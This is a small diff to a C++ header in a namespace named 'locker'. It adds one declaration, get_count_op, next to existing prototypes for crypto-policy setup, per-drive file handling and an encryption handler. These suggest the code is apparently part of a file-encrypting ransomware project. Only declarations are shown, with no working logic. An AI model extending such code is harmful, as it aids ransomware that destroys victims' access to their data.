@@ -118,6 +118,7 @@ namespace locker
 	bool GeneratePolicy(CRYPT_INFO* CryptInfo);
 	bool CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info);
 
+	std::pair<size_t, size_t> get_count_op();
 	bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo);
 	void free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO, bool success);
 	bool HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data);
